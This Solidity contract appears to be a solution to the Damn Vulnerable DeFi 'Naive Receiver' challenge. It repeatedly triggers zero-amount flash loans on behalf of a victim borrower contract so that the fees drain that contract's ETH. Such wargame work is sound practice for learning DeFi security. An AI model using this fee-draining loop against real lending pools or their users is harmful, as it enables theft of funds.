// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title Attacker, call flashloans on 
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract NaiveAttacker {

    address payable private pool;
    address private s_loserContract;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    error UnsupportedCurrency();

    constructor(address payable _pool, address _loserContract) {
        pool = _pool;
        s_loserContract = _loserContract;
    }

    // Internal function where the funds received would be used
    function attack(uint16 a_times) external {
        for (uint i = 0; i < a_times; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(
                IERC3156FlashBorrower(s_loserContract),
                ETH,
                0,
                bytes("")
            );
        }

        if (address(this).balance > 0) {
            revert("Attack failed");
        }
    }

    // Allow deposits of ETH
    receive() external payable {}
}
